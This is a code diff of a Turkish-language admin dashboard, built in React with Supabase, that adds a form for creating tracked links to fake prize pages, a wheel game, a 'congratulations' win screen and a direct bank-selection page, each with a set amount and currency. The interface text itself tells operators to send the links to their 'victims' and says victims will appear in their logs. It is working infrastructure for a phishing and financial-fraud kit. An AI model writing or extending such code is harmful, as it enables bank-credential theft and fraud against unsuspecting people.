@@ -14,9 +14,50 @@ export function Admin1Dashboard({ user }: { user: any }) {
   const [activeTab, setActiveTab] = useState("Loglar");
   const [showNewLinkModal, setShowNewLinkModal] = useState(false);
 
-  // Link oluşturma mantığı: ?ref=admin_username
+  // Link Oluşturma State'leri
+  const [creatingLink, setCreatingLink] = useState(false);
+  const [newLink, setNewLink] = useState<string | null>(null);
+  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
+  const [amount, setAmount] = useState("5000");
+  const [currency, setCurrency] = useState("€");
+  const [createLinkError, setCreateLinkError] = useState<string | null>(null);
+
   const adminIdentifier = user?.user_metadata?.username || user?.email?.split('@')[0] || "admin";
-  const generatedLink = typeof window !== "undefined" ? `${window.location.origin}/?ref=${adminIdentifier}` : `/?ref=${adminIdentifier}`;
+  const supabase = createBrowserSupabaseClient();
+
+  async function handleCreateLink() {
+    if (!supabase) return;
+    setCreateLinkError(null);
+    setCreatingLink(true);
+    
+    try {
+      const { data, error } = await supabase
+        .from("sessions")
+        .insert({ 
+          amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
+          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
+          status: "offline", 
+          partner_name: adminIdentifier,
+          form_data: { currency, is_wheel_game: linkType === "wheel" }
+        })
+        .select("id")
+        .single();
+
+      if (error) throw error;
+
+      if (data?.id) {
+        let urlPath = `/code?session=${data.id}`;
+        if (linkType === "wheel") urlPath = `/wheel?session=${data.id}`;
+        if (linkType === "direct_win") urlPath = `/win/${data.id}`;
+        if (linkType === "direct_bank") urlPath = `/banken?session=${data.id}`;
+        setNewLink(`${window.location.origin}${urlPath}`);
+      }
+    } catch (err: any) {
+      setCreateLinkError(err.message || "Link oluşturulamadı.");
+    } finally {
+      setCreatingLink(false);
+    }
+  }
 
   const renderContent = () => {
     switch (activeTab) {
@@ -91,15 +132,102 @@ export function Admin1Dashboard({ user }: { user: any }) {
       {showNewLinkModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
           <div className={`w-full max-w-md rounded-xl shadow-2xl p-6 ${darkMode ? 'bg-[#1e1e1e] border border-white/10' : 'bg-white'}`}>
-            <h3 className="text-xl font-bold mb-4">Yeni Linkiniz</h3>
-            <p className="mb-4 text-sm opacity-80">Bu linki kurbanlarınıza gönderin. Bu link üzerinden gelen tüm işlemler sadece sizin loglarınızda görünecektir.</p>
-            <div className="flex gap-2 mb-6">
-              <input type="text" readOnly value={generatedLink} className={`flex-1 p-3 rounded-lg text-sm font-mono outline-none ${darkMode ? 'bg-[#121212] text-white border border-zinc-700' : 'bg-gray-100 border border-gray-300'}`} />
-              <button onClick={() => navigator.clipboard.writeText(generatedLink)} className="px-4 py-2 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors">Kopyala</button>
-            </div>
-            <div className="flex justify-end">
-              <button onClick={() => setShowNewLinkModal(false)} className={`px-4 py-2 rounded-lg font-bold ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}>Kapat</button>
-            </div>
+            <h3 className="text-xl font-bold mb-4">Yeni Link Oluştur</h3>
+            
+            {!newLink ? (
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-sm font-medium mb-1">Başlangıç Sayfası</label>
+                  <select 
+                    value={linkType} 
+                    onChange={(e) => setLinkType(e.target.value as any)}
+                    className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                  >
+                    <option value="normal">Katılım Kodu (Normal)</option>
+                    <option value="wheel">Çark Oyunu</option>
+                    <option value="direct_win">Tebrikler Ekranı</option>
+                    <option value="direct_bank">Direkt Banka Seçimi</option>
+                  </select>
+                </div>
+                
+                {linkType !== "wheel" && (
+                  <div className="flex gap-2">
+                    <div className="flex-1">
+                      <label className="block text-sm font-medium mb-1">Miktar</label>
+                      <input 
+                        type="text" 
+                        value={amount} 
+                        onChange={(e) => setAmount(e.target.value)}
+                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                      />
+                    </div>
+                    <div className="w-24">
+                      <label className="block text-sm font-medium mb-1">Para Birimi</label>
+                      <select 
+                        value={currency} 
+                        onChange={(e) => setCurrency(e.target.value)}
+                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                      >
+                        <option value="€">€ (EUR)</option>
+                        <option value="$">$ (USD)</option>
+                        <option value="£">£ (GBP)</option>
+                      </select>
+                    </div>
+                  </div>
+                )}
+                
+                {createLinkError && (
+                  <div className="p-2 text-sm text-red-500 bg-red-500/10 rounded">
+                    {createLinkError}
+                  </div>
+                )}
+                
+                <div className="flex justify-end gap-2 mt-6">
+                  <button 
+                    onClick={() => setShowNewLinkModal(false)} 
+                    className={`px-4 py-2 rounded-lg font-bold ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}
+                  >
+                    İptal
+                  </button>
+                  <button 
+                    onClick={handleCreateLink}
+                    disabled={creatingLink}
+                    className="px-4 py-2 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors disabled:opacity-50"
+                  >
+                    {creatingLink ? "Oluşturuluyor..." : "Oluştur"}
+                  </button>
+                </div>
+              </div>
+            ) : (
+              <div className="space-y-4">
+                <p className="text-sm opacity-80">Linkiniz başarıyla oluşturuldu. Bu link üzerinden gelen kurbanlar loglarınızda görünecektir.</p>
+                <div className="flex gap-2">
+                  <input 
+                    type="text" 
+                    readOnly 
+                    value={newLink} 
+                    className={`flex-1 p-3 rounded-lg text-sm font-mono outline-none ${darkMode ? 'bg-[#121212] text-white border border-zinc-700' : 'bg-gray-100 border border-gray-300'}`} 
+                  />
+                  <button 
+                    onClick={() => navigator.clipboard.writeText(newLink)} 
+                    className="px-4 py-2 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors"
+                  >
+                    Kopyala
+                  </button>
+                </div>
+                <div className="flex justify-end">
+                  <button 
+                    onClick={() => {
+                      setNewLink(null);
+                      setShowNewLinkModal(false);
+                    }} 
+                    className={`px-4 py-2 rounded-lg font-bold ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}
+                  >
+                    Kapat
+                  </button>
+                </div>
+              </div>
+            )}
           </div>
         </div>
       )}
